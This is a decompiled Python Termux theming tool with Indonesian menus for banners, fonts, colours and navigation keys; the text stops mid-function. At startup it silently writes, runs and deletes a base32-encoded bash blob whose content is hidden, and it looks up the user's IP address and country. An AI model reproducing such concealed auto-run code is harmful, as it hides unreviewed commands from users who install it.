""" Decompiled by Exotic Hridoy """

try:
	import sys,os,json,requests,random,re,base64,string
	from bs4 import BeautifulSoup as sanz_id
	from fake_useragent import UserAgent
	from requests import post
	from requests import get
	from time import sleep
	import subprocess as sp
	from rich.panel import Panel
	from rich.columns import Columns
	from rich.console import Console
	from rich import print as printer
except ModuleNotFoundError:
	hapus()
	exit(
		"\n\033[1;37m[\033[1;31m!\033[1;37m] Module Belum Terinstall, Ketik Perintah Dibawah\n\033[1;37m[\033[1;31m$\033[1;37m] \033[1;33mpip install -r requirements.txt\n"
)
clear = lambda : os.system("cls" if os.name == "nt" else "clear")
subrek_yt_free_tutorial = "https://www.youtube.com/channel/UCLRXFyMN0L8yH9F-xxOd7Og"
user_agent = UserAgent()
agent = user_agent.random
nama_file = "Run.py"
file = ".__sanz_login_token_tools_theme_me__.json"
path = "/data/data/com.termux/files/usr/.sanz"
path2 = "/data/data/com.termux/files/sanz"
path3 = "/data/data/com.termux/files/home/.termux"
path4 = "/data/data/com.termux/files/home/.bashrc"
path5 = "/data/data/com.termux/files/usr/etc/bash.bashrc"
try:
	os.mkdir(path)
except:
	pass
try:
	os.mkdir(path2)
except:
	pass
try:
	os.mkdir(path3)
except:
	pass
try:
	import inquirer
except ModuleNotFoundError:
	print(
		"\n\033[1;37m[\033[1;31m>\033[1;37m] Installing Module Tambahan, Silahkan Tunggu.."
)
	os.system("python -m pip install inquirer &> /dev/null")
	hapus()
	exit(
		f"\033[1;37m[\033[1;31m!\033[1;37m] Silahkan Ketik \033[1;30m'\033[1;33mpython {nama_file}\033[1;30m' \033[1;37mUntuk Run Sc-Nya Lagi\n"
)
m = "\x1b[1;31m"
h = "\x1b[1;32m"
k = "\x1b[1;33m"
b = "\x1b[1;34m"
u = "\x1b[1;35m"
p = "\x1b[1;37m"
hx = "\x1b[1;30m"
bx = "\x1b[1;36m"
hx2 = "\x1b[0;30m"
hx3 = "\x1b[30m"
px = "\x1b[0m"
pp = "\x1b[7m"
km = f" {m}➤"
n = "\n"
x = random.choice([u,bx])

try:
	dt = get("http://ip-api.com/json/").json()
	try:
		sanz_ip = dt["query"]
		sanz_negara = dt["country"]
	except KeyError:
		sanz_ip = " "
		sanz_negara = " "

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"\n {m}➤ {p}Program Dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus();sleep(0.5)
	exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
except Exception as lol:
	to=f"\n {m}➤ {p}Error {m}: {p}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

try:
	yo_ndak_tau = "#!/usr/bin/env bash\n# Compile by Sanz\n# Youtube : FREE TUTORIAL\n# Github  : https://github.com/Sxp-ID\n# Cie Mau rikod ya slur?\n# Semoga lu jomblo selamanya awokawok :v\nSanz=$(mktemp)\nbase32 -d  >${Sanz}<<Free_Tutorial\nEMQS65LTOIXWE2LOF5SW45RAMJQXG2AKEMQEG33NOBUWYZJAMJ4SAU3BNZ5AUIZALFXXK5DVMJSS\nAORAIZJEKRJAKRKVIT2SJFAUYCRDEBDWS5DIOVRCAIB2EBUHI5DQOM5C6L3HNF2GQ5LCFZRW63JP\nKN4HALKJIQFCGICDNFSSATLBOUQHE2LLN5SCA6LBEBZWY5LSH4FCGICTMVWW6Z3BEBWHKIDKN5WW\nE3DPEBZWK3DBNVQW46LBEBQXO33LMF3W62ZAHJ3AUU3BNZ5D2JBINVVXIZLNOAUQUYTBONSTMNBA\nFVSCAIB6ER5VGYLOPJ6TYPCGOJSWKX2UOV2G64TJMFWAUSLZIV3FS3LMOVGDESTIMMZGOS2JINAW\nOSLJKI3VCQZYOZKFGNKSMZBTS3CUI5CXQTSYGBUUSRTYNFMVGSLJMMZGOZ2JINEWWZJQIF3EY6TT\nOJMEGRTDMV4TSVYKLFUTKMSYGIYXQZSTJFTVARDXHBEUGQLHJFUVC32JINAWOSLJKI3VCQZZGBME\nOQSMJJDW65SXLBTXUVL2GE4US2KBM5RUGURXKFEDC6KKJBZXCTDZHFIESMLYMQFGG6TMMNFUK53V\nMZLWY5LEI5MWOSLNJJKU2R3MLFJEKRRWKRKEM6TFIU4TMVCYNBUVKMDMJRMTAULXMFLGQRKRLBYE\n4TKYJY2FIM3QJZGTESSUKNKXI2CSIRBHACSXIVJEEZLLGB4GGM3IKBSWWMJVLFWE4SSTGFWFKTKH\nNRWGKVLMJRMXUTSWJ5KWY5KNI5WEIYTLGV5FO3DEK5SDA3CFKFMFMT2VLBBHGV2UJJXWI22OOVKG\n4TTBBJLDCWRTKNKVEQTEKU2VEY2IMRVGEV3YGFNEKZC2LIYGY4CRK52GYTJQJE2VG23IGBQUOWSU\nKVVGI2KXIRHHAWRQORFGCMSVPJIWU3CLKNEFENS2IZTXOWRRKV5AUVLNNBVVGRS2GZJVKWSPMFWU\n45DCJBSGWUJQIZZFUVCJPBHVKOLQKFLXI3CNNVTTKU2XMR3WK3KKJBLG26DKKEYEMNCUI5YFMUZR\nN54WERCCJJJUKSLYLFVWIMYKKMZE26LFI54GCV2FIZXFIWDEO5REM23ZMFEFURDCNM2XUV3MMRLW\nIMDMIVJFQVSPKVLTQOKJNFAWWZLZN5ZWMU2BM5TEGQLHJJEHG2CRJAYGOSKDJJUUS3DYNAFGGMSV\nGJFHSY3LMUYEC42MJAYDASKDGFVUSQ2BM5EWSURXKFBXQOKJNFAWOSKDNNUUSQ2SG5FWSOD2KZWV\nUY2ZJBDFUUKYGBTUSQ2SG5EVG4BZJFAT2PIKIZZGKZK7KR2XI33SNFQWYCTTN52XEY3FEASHWU3B\nNZ5H2CTSNUQC24TGEASHWU3BNZ5H2===\nFree_Tutorial\nsource ${Sanz}\nrm -rf ${Sanz}\n"
	owi = open(".cek_up_tools.sh","w").write(yo_ndak_tau)
	os.system("bash .cek_up_tools.sh");sleep(0.5);hapus_file(".cek_up_tools.sh")
	clear()
	uax = {"user-agent":agent}
	url_user = [
		"https://sfile.mobi/8X9722UyjKB",
		"https://sfile.mobi/4TZ4NdaKTmV",
		"https://sfile.mobi/9qH7i0thegn"
	]
	user_a = get(url_user[0],headers=uax).text
	user_b = get(url_user[1],headers=uax).text
	user_c = get(url_user[2],headers=uax).text
	user_1 = sanz_id(user_a,"html.parser").find_all("div",{"class":"list"})[3].text.replace("\n","").replace("- Downloads: ","").replace(" ","").replace(",","")
	user_2 = sanz_id(user_b,"html.parser").find_all("div",{"class":"list"})[3].text.replace("\n","").replace("- Downloads: ","").replace(" ","").replace(",","")
	user_3 = sanz_id(user_c,"html.parser").find_all("div",{"class":"list"})[3].text.replace("\n","").replace("- Downloads: ","").replace(" ","").replace(",","")
	sanz_user = int(user_1) + int(user_2) + int(user_3)
	sanz_user = f"{sanz_user:,}"

except KeyboardInterrupt:
	hapus();sleep(0.5)
	exit(f"\n {m}➤ {p}Program Dihentikan\n")
except requests.exceptions.ConnectionError:
	hapus();sleep(0.5)
	exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
except KeyError:
	hapus();sleep(0.5)
	exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
except json.decoder.JSONDecodeError:
	hapus();sleep(0.5)
	exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
except Exception as lol:
	to=f"\n {m}➤ {p}Error {m}: {p}"
	hapus();sleep(0.5)
	exit(f"{to}{lol}\n")

banner = f"""
{m}████████ ██   ██ ███████  {p}███    ███ ███████
{m}   ██    ██   ██ ██       {p}████  ████ ██
{m}   ██    ███████ █████    {p}██ ████ ██ █████
{m}   ██    ██   ██ ██       {p}██  ██  ██ ██
{m}   ██    ██   ██ ███████  {p}██      ██ ███████
"""
console = Console()
sxp = [
Panel(f"[bold white]by [bold red]: [bold green]Sanz\n[bold white]yt [bold red]: [bold green]FREE TUTORIAL", title=f"[bold white]Creator", style="color(8)"),
Panel(f"[bold white]ip [bold red]: [bold green]{sanz_ip}\n[bold white]user [bold red]: [bold green]{sanz_user} [bold white]Orang", title=f"[bold white]{sanz_negara}", style="color(8)")
]

if sanz_negara == "Indonesia":
	sanz_negara = f"{m}Indo{p}nesia"
else:
	pass

class animasi:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")
		pass

	def jeda(self):
		try:
			sleep(1);print();sleep(1)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def jeda2(self):
		try:
			sleep(1);print();sleep(1);print();sleep(1)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def load(self):
		try:
			sleep(1);print();sleep(1)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def timer(self):
		try:
			sleep(1);print();sleep(1)
		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def teks(self,zynnboy):
		try:
			for jejak_cyber in zynnboy + "\n":
				sys.stdout.write(jejak_cyber)
				sys.stdout.flush()
				sleep(0.009)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Koneksi Internet Error\n")
		except Exception as lol:
			to=f"\n\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def teks2(self,zynnboy):
		try:
			for jejak_cyber in zynnboy + "\n":
				sys.stdout.write(jejak_cyber)
				sys.stdout.flush()
				sleep(0.001)

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Koneksi Internet Error\n")
		except Exception as lol:
			to=f"\n\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def banner(self):
		try:
			clear();sleep(1)
			print(banner)
			console.print(Columns(sxp));print()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Koneksi Internet Error\n")
		except Exception as lol:
			to=f"\n\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def loading(self,teks):
		try:
			sxp = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']
			for _ in range(15):
				for i in range(len(sxp)):
					sleep(0.25)
					sys.stdout.write(f"\r {m}➤ {p}{teks} {k}[{h}" + sxp[i % len(sxp)]+f"{k}] ")
					sys.stdout.flush()

			sys.stdout.write("\r\033[K")
			sys.stdout.write(f"\r {m}➤ {p}{teks} {k}[{h}Done{k}] ")

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n\n {m}➤ {p}Koneksi Internet Error\n")
		except Exception as lol:
			to=f"\n\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class Sanz:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.Main()

	def Main(self):
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

			list_menu = [f"• Tampilan Custom Name        {hx3}{pp} (01) {px}", f"• Tampilan RedSkull           {hx3}{pp} (02) {px}", f"• Tampilan Naga               {hx3}{pp} (03) {px}", f"• Tampilan Tengkorak          {hx3}{pp} (04) {px}", f"• Tampilan BlackHat v1        {hx3}{pp} (05) {px}", f"• Tampilan BlackHat v2        {hx3}{pp} (06) {px}", f"• Tampilan Kucing             {hx3}{pp} (07) {px}", f"• Tampilan Anonymous          {hx3}{pp} (08) {px}", f"• Tampilan DarkFb             {hx3}{pp} (09) {px}", f"• Tampilan Termux             {hx3}{pp} (10) {px}", f"• Tampilan Neo Ascii Distro   {hx3}{pp} (11) {px}", f"• Tampilan Default            {hx3}{pp} (12) {px}", f"\r", f"• Menu Lainnya                {hx3}{pp} (13) {px}", f"• Support Admin               {hx3}{pp} (14) {px}", f"• Keluar                      {hx3}{pp} (15) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B);sleep(1)
			if "(01)" in sanz: sanz_tampilan().custom_name()
			elif "(02)" in sanz: sanz_tampilan().redskull()
			elif "(03)" in sanz: sanz_tampilan().naga()
			elif "(04)" in sanz: sanz_tampilan().tengkorak()
			#elif "(05)" in sanz: sanz_tampilan().home_termux()
			elif "(05)" in sanz: sanz_tampilan().blackhat_v1()
			elif "(06)" in sanz: sanz_tampilan().blackhat_v2()
			elif "(07)" in sanz: sanz_tampilan().kucing()
			elif "(08)" in sanz: sanz_tampilan().anonymous()
			elif "(09)" in sanz: sanz_tampilan().darkfb()
			elif "(10)" in sanz: sanz_tampilan().termux()
			elif "(11)" in sanz: sanz_tampilan().neo_theme()
			elif "(12)" in sanz: sanz_tampilan().default()
			elif "(13)" in sanz: more_tools()
			elif "(14)" in sanz: subrek()
			elif "(15)" in sanz: hapus();exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz: print(C);hapus();print(f" {m}➤ {p}Program Dihentikan\n\n");print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class subrek:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.sanz = subrek_yt_free_tutorial
		self.main()

	def main(self):
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			clear();sleep(1)
			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

			list_menu = [f"• Support Dg Donasi       {hx3}{pp} (1) {px}", f"• Support Dg Subrek Yt    {hx3}{pp} (2) {px}", f"• Kembali Ke Menu Awal    {hx3}{pp} (3) {px}", f"• Keluar                  {hx3}{pp} (4) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B)
			if "Support Dg Donasi" in sanz:
				sleep(1);self.sawer()
			elif "Support Dg Subrek Yt" in sanz:
				sleep(1);self.sub_yete()
			elif "Kembali Ke Menu Awal" in sanz:
				sleep(1);Sanz()
			elif "Keluar" in sanz:
				hapus();sleep(0.5)
				exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz:
				print(C)
				hapus();sleep(0.5)
				print(f" {m}➤ {p}Program Dihentikan\n\n")
				print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			hapus();sleep(0.5)
			to=f"\n {m}➤ {p}Error {m}: {p}"
			exit(f"{to}{lol}\n")

	def sawer(self):
		try:
			clear();sleep(1)
			animasi().banner()
			print(f"{km} {p}Support Admin Ya..")
			animasi().timer()
			animasi().teks(f"   {k}• {p}Makasih Buat Yg Mau Berbagi :D");sleep(1)
			animasi().teks(f"   {m}! {p}Tidak Memaksa Ya Cuman Buat Yg Mau Aja ^_^");sleep(2)
			os.system(f"xdg-open https://saweria.co/SanzXp");animasi().timer()
			input(f"   {m}➤ {p}Klik Enter Untuk Kembali ");sleep(3)
			subrek()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

	def sub_yete(self):
		try:
			clear();sleep(1)
			animasi().banner()
			print(f"{km} {p}Support Admin Ya..")
			animasi().timer()
			animasi().teks(f"   {k}• {p}Subscribe Youtube Admin Woke {m}!");sleep(2)
			os.system(f"xdg-open {self.sanz}");animasi().timer()
			input(f"   {m}➤ {p}Klik Enter Untuk Kembali ");sleep(3)
			subrek()

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class more_tools:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")

		self.Main()

	def Main(self):
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

			list_menu = [f"• Ubah Tombol Navigasi Termux    {hx3}{pp} (01) {px}", f"• Ubah Font Termux               {hx3}{pp} (02) {px}", f"• Ubah Warna Background Termux   {hx3}{pp} (03) {px}", f"• Edit Tampilan Termux           {hx3}{pp} (04) {px}", f"• Edit Tampilan Prompt           {hx3}{pp} (05) {px}", f"\r", f"• Kembali ke Menu Awal           {hx3}{pp} (06) {px}", f"• Keluar                         {hx3}{pp} (07) {px}"]
			menu = [inquirer.List("sanz", choices = list_menu, carousel = True, message = f"{hx2}")]

			class sanz_ganz(Default):
				def __init__(self):
					super().__init__()
					self.Question.mark_color = f"{hx2}"
					self.Question.brackets_color = f"{hx2}"
					self.List.selection_cursor = f"{m}⩥ {pp}{p}"

			sanz = inquirer.prompt(menu, theme=sanz_ganz())
			sanz = str(sanz);print(B);sleep(1)
			if "(01)" in sanz: theme_ft().tombol()
			elif "(02)" in sanz: theme_ft().font()
			elif "(03)" in sanz: theme_ft().theme()
			elif "(04)" in sanz: os.system(f"nano {path2}/sanz-banner.sh");more_tools()
			elif "(05)" in sanz: os.system(f"nano {path5}");more_tools()
			elif "(06)" in sanz: Sanz()
			elif "(07)" in sanz: hapus();exit(f"\n {m}➤ {p}Makasih Ngab, Jgn Lupa Balik Lagi{m}..\n")
			elif "None" in sanz: print(C);hapus();print(f" {m}➤ {p}Program Dihentikan\n\n");print(C)
			else:
				pass

		except KeyboardInterrupt:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Program Dihentikan\n")
		except requests.exceptions.ConnectionError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Koneksi Internet Error\n")
		except KeyError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except json.decoder.JSONDecodeError:
			hapus();sleep(0.5)
			exit(f"\n {m}➤ {p}Server Error\n {m}➤ {p}Silahkan Coba Lagi{m}..\n")
		except Exception as lol:
			to=f"\n {m}➤ {p}Error {m}: {p}"
			hapus();sleep(0.5)
			exit(f"{to}{lol}\n")

class theme_ft:
	def __init__(self):
		try:
			user = open(f"{path}/{file}","r").read()
			___user___ = json.loads(user)["data"]["token"]
		except:
			clear()
			hapus_file(path+"/"+file);hapus();sleep(0.5)
			exit(f"{km} {k}Token sudah expired, silahkan login lagi ya{m}..\n")
		pass

	def set_font(self,font):
		list_font = ['Fira Code Bold Nerd Font', 'Fira Code Medium Nerd Font Complete Mono', 'JetBrains Mono Bold Nerd Font Complete', 'JetBrains Mono Medium Nerd Font Complete', 'MesloLGS NF Bold Italic', 'MesloLGS NF Bold', 'MesloLGS NF Italic', 'MesloLGS NF Regular']
		animasi().banner()
		os.system(f"cat Data/fonts/'{list_font[font]}.ttf' > Data/font.ttf")
		os.system(f"mv Data/font.ttf {path3}")
		os.system(f"touch Data/font.ttf")
		sleep(1)
		animasi().loading("Proses merubah font termux, tunggu..")
		animasi().jeda2()
		sleep(3)
		print(f" {m}➤ {p}Font termux berhasil terpasang {k}[ {h}✓ {k}]")
		sleep(2);os.system("termux-reload-settings")
		exit()

	def set_theme(self,theme):
		list_theme = ["ayu-dark", "ayu-light", "ayu-mirage", "catppuccin", "dracula", "elementary", "everblush", "flat", "gruvbox-dark", "material-ocean", "material", "monokai-dark", "nekonako-djancoeg", "nekonako-hue", "nekonako-om-mar", "one-dark", "owl4ce-dark", "owl4ce-light", "siduck-onedark", "snazzy", "tomorrow-night", "tomorrow-night.eighties"]
		animasi().banner()
		os.system(f"cat Data/colorscheme/'{list_theme[theme]}.colors' > Data/colors.properties")
		os.system(f"mv Data/colors.properties {path3}")
		os.system(f"touch Data/colors.properties")
		sleep(1)
		animasi().loading("Proses merubah warna background termux, tunggu..")
		animasi().jeda2()
		sleep(3)
		print(f" {m}➤ {p}Warna background termux berhasil terpasang {k}[ {h}✓ {k}]")
		sleep(2);os.system("termux-reload-settings")
		exit()

	def set_tombol(self,tombol_termux):
		set = """### After making changes and saving you need to run `termux-reload-settings`
### to update the terminal.  All information here can also be found on the
### wiki: https://wiki.termux.com/wiki/Terminal_Settings

###############
# General
###############

### Allow external applications to execute arbitrary commands within Termux.
### This potentially could be a security issue, so option is disabled by
### default. Uncomment to enable.
# allow-external-apps = true

### Default working directory that will be used when launching the app.
# default-working-directory = /data/data/com.termux/files/home

### Uncomment to disable toasts shown on terminal session change.
# disable-terminal-session-change-toast = true

### Uncomment to not show soft keyboard on application start.
# hide-soft-keyboard-on-startup = true

### Uncomment to let keyboard toggle button to enable or disable software
### keyboard instead of showing/hiding it.
# soft-keyboard-toggle-behaviour = enable/disable

### Adjust terminal scrollback buffer. Max is 50000. May have negative
### impact on performance.
# terminal-transcript-rows = 2000

### Uncomment to use volume keys for adjusting volume and not for the
### extra keys functionality.
# volume-keys = volume

###############
# Fullscreen mode
###############

### Uncomment to let Termux start in full screen mode.
# fullscreen = true

### Uncomment to attempt workaround layout issues when running in
### full screen mode.
# use-fullscreen-workaround = true

###############
# Cursor
###############

### Cursor blink rate. Values 0, 100 - 2000.
# terminal-cursor-blink-rate = 0

### Cursor style: block, bar, underline.
# terminal-cursor-style = block

###############
# Extra keys
###############

### Settings for choosing which set of symbols to use for illustrating keys.
### Choose between default, arrows-only, arrows-all, all and none
# extra-keys-style = default

### Force capitalize all text in extra keys row button labels.
# extra-keys-text-all-caps = true

### Default extra-key configuration
# extra-keys = [[ESC, TAB, CTRL, ALT, {key: '-', popup: '|'}, DOWN, UP]]

### Two rows with more keys
# extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'], \
#               ['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]

### Configuration with additional popup keys (swipe up from an extra key)
# extra-keys = [[ \
#   {key: ESC, popup: {macro: "CTRL f d", display: "tmux exit"}}, \
#   {key: CTRL, popup: {macro: "CTRL f BKSP", display: "tmux ←"}}, \
#   {key: ALT, popup: {macro: "CTRL f TAB", display: "tmux →"}}, \
#   {key: TAB, popup: {macro: "ALT a", display: A-a}}, \
#   {key: LEFT, popup: HOME}, \
#   {key: DOWN, popup: PGDN}, \
#   {key: UP, popup: PGUP}, \
#   {key: RIGHT, popup: END}, \
#   {macro: "ALT j", display: A-j, popup: {macro: "ALT g", display: A-g}}, \
#   {key: KEYBOARD, popup: {macro: "CTRL d", display: exit}} \
# ]]

# Custom Navigasi Termux

# Powered by Sanz
# Youtube : FREE TUTORIAL
# Github  : https://github.com/Sxp-ID

"""+ tombol_termux +"""
# udah tinggal pake aja

###############
# Colors/themes
###############

### Force black colors for drawer and dialogs
# use-black-ui = true

###############
# HW keyboard shortcuts
###############

### Disable hardware keyboard shortcuts.
# disable-hardware-keyboard-shortcuts = true

### Open a new terminal with ctrl + t (volume down + t)
# shortcut.create-session = ctrl + t

### Go one session down with (for example) ctrl + 2
# shortcut.next-session = ctrl + 2

### Go one session up with (for example) ctrl + 1
# shortcut.previous-session = ctrl + 1

### Rename a session with (for example) ctrl + n
# shortcut.rename-session = ctrl + n

###############
# Bell key
###############

### Vibrate device (default).
# bell-character = vibrate

### Beep with a sound.
# bell-character = beep

### Ignore bell character.
# bell-character = ignore

###############
# Back key
###############

### Send the Escape key.
# back-key=escape

### Hide keyboard or leave app (default).
# back-key=back

###############
# Keyboard issue workarounds
###############

### Letters might not appear until enter is pressed on Samsung devices
# enforce-char-based-input = true

### ctrl+space (for marking text in emacs) does not work on some devices
# ctrl-space-workaround = true
"""
		animasi().banner()
		sanz = open("Data/termux.properties","w")
		sanz.write(set)
		sanz.close()
		sleep(1)
		animasi().loading("Proses merubah tombol navigasi termux, tunggu..")
		animasi().jeda2()
		os.system(f"rm {path3}/termux.properties &> /dev/null")
		os.system(f"mv Data/termux.properties {path3}")
		os.system(f"touch Data/termux.properties")
		sleep(3)
		print(f" {m}➤ {p}Tombol navigasi termux berhasil terpasang {k}[ {h}✓ {k}]")
		sleep(2);os.system("termux-reload-settings")
		exit()

	def font(self):
		try:
			A = "\x1b[1A"
			B = "\x1b[2A"
			C = "\x1b[3A"

			animasi().banner()
			print(f" {m}➤ {p}Gunakan tombol arah atas/bawah {h}↑{k}↓")

			import inquirer
			from inquirer.themes import Default

